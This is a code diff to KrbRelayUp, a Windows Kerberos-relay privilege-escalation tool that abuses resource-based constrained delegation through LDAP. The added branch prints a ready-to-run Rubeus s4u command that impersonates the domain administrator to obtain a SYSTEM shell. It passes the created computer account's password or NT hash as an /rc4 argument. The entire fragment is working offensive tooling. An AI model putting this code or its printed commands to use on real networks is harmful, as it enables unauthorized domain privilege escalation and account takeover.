@@ -25,15 +25,32 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
                 Console.WriteLine("[+] RBCD rights added successfully");
                 if (Options.phase != Options.PhaseType.Full)
                 {
-                    Console.WriteLine("[+] Run the spawn method for SYSTEM shell:");
-                    Console.Write($"    ./KrbRelayUp.exe spawn -m rbcd -d {Options.domain} -dc {Options.domainController} -cn {Options.rbcdComputerName}$ ");
-                    if (!String.IsNullOrEmpty(Options.rbcdComputerPassword))
+                    if (!Options.rbcdUseU2U)
+                    {
+                        Console.WriteLine("[+] Run the spawn method for SYSTEM shell:");
+                        Console.Write($"    ./KrbRelayUp.exe spawn -m rbcd -d {Options.domain} -dc {Options.domainController} -cn {Options.rbcdComputerName}$ ");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[+] Run Rubeus s4u method for SYSTEM shell (https://github.com/GhostPack/Rubeus/pull/137):");
+                        Console.Write($"    ./Rubeus.exe s4u /u2u /domain:{Options.domain} /user:{Options.rbcdComputerName} /impersonateuser:administrator /msdsspn:host/{Environment.MachineName} [/altservice:http] [/nowrap] [/ptt] [/createnetonly:C:\\Windows\\System32\\cmd.exe] [/show] ");
+                    }
+
+                    if (!String.IsNullOrEmpty(Options.rbcdComputerPassword) && !Options.rbcdUseU2U)
                     {
                         Console.WriteLine($"-cp {Options.rbcdComputerPassword}");
                     }
-                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash))
+                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash) && !Options.rbcdUseU2U)
                     {
                         Console.WriteLine($"-ch {Options.rbcdComputerPasswordHash}");
+                    }
+                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPassword) && Options.rbcdUseU2U)
+                    {
+                        Console.WriteLine($"/rc4:NTHASH({Options.rbcdComputerPassword})");
+                    }
+                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash) && Options.rbcdUseU2U)
+                    {
+                        Console.WriteLine($"/rc4:{Options.rbcdComputerPasswordHash}");
                     }
                     else
                     {
